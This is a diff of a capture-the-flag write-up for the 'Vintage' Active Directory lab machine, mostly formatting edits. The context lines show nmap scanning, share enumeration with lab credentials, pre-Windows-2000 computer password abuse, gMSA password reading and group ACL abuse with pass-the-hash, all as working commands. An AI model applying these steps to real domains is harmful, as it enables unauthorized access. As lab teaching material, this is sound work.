@@ -12,11 +12,15 @@ lang: 'en'
 ---
 
 # Description
+
 Vintage is a challenging Active Directory machine characterized by disabled NTLM authentication, enabled antivirus protection, and complex security configurations. The machine involves exploiting a Pre-2000 computer account, leveraging multiple ACL/ACE vulnerabilities, decrypting Data Protection API (DPAPI) secrets, and manipulating Resource-Based Constrained Delegation.
 
 # Recon
+
 ## nmap
+
 `nmap` shows open ports that are common on a Domain Controller machine.
+
 ```bash
 # Nmap 7.95 scan initiated Tue Jan 14 17:05:51 2025 as: nmap -p- -T4 -sSCV -vv -oN nmap.txt 10.10.11.45
 Nmap scan report for 10.10.11.45 (10.10.11.45)
@@ -46,14 +50,21 @@ PORT      STATE SERVICE       REASON          VERSION
 60401/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
+
 It reveals the hostname `DC01` and the domain `vintage.htb`, make sure to add those and the FQDN to `/etc/hosts`.
+
 ```bash
 10.10.11.45 dc01.vintage.htb dc01 vintage.htb
 ```
+
 # Auth as p.rosa
+
 ## Enumeration
+
 ### Shares
+
 With the given credentials `P.Rosa:Rosaisbest123`, we could try to check our current access level.
+
 ```bash
 ❯ nxc smb vintage.htb -u P.Rosa -p Rosaisbest123 --shares
 SMB         10.10.11.45     445    10.10.11.45      [*]  x64 (name:10.10.11.45) (domain:10.10.11.45) (signing:True) (SMBv1:False)
@@ -121,7 +132,9 @@ Don't forget to retrieve the user list from this machine, it might be useful lat
 ```bash
 nxc smb dc01.vintage.htb --use-kcache --users | awk '{print $5}' | tail -n +4 | head -n -1 > users.txt
 ```
+
 ### bloodhound
+
 I will use `rusthound-ce` to remotely collect information from the domain.
 
 ```bash
@@ -143,16 +156,18 @@ When a new computer account is configured as "pre-Windows 2000 computer", its pa
 
 According to [Pre-Windows 2000 computers](https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers#pre-windows-2000-computers), the password for the computer account is the lowercase computer name without the trailing `$` if it hasn't been changed.
 
-
-
 # Auth as fs01$
+
 ## Validate Pre2k machine creds
+
 And `FS01\$:fs01` is a valid credentials.
 
 ```bash
 getTGT.py -dc-ip 10.10.11.45 vintage.htb/FS01\$:fs01
 ```
+
 ## Enumeration
+
 ### ReadGMSAPassword
 
 <p align="center">
@@ -169,13 +184,14 @@ bloodyAD -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb get objec
 ```
 
 # Auth as gmsa01$
+
 ## Enumeration
 
 <p align="center">
   <img src="/machines/vintage/gmsa01_acl.png" alt="GMSA01$ ACL" />
 </p>
 
-`GMSA01$` has  `GenericWrite` permissions on the `SERVICEMANAGERS` group, which in turn grants `AddSelf` as well.
+`GMSA01$` has `GenericWrite` permissions on the `SERVICEMANAGERS` group, which in turn grants `AddSelf` as well.
 
 <p align="center">
   <img src="/machines/vintage/servicemanagers_acl.png" alt="SERVICEMANAGERS ACL" />
@@ -199,6 +215,7 @@ bloodyAD -d vintage.htb -k --dc-ip 10.10.11.45 --host dc01.vintage.htb add group
 ```
 
 Get a new TGT.
+
 ```bash
 getTGT.py -dc-ip 10.10.11.45 vintage.htb/gmsa01\$ -hashes ":<NTHash>"
 ```
@@ -298,6 +315,7 @@ Looks like the password works for the `C.Neri` user as well. Let's see what this
 Because this user belongs to the `Remote Management Users` group, we could log in using WinRM.
 
 # Auth as c.neri
+
 ## User Flag
 
 ```bash
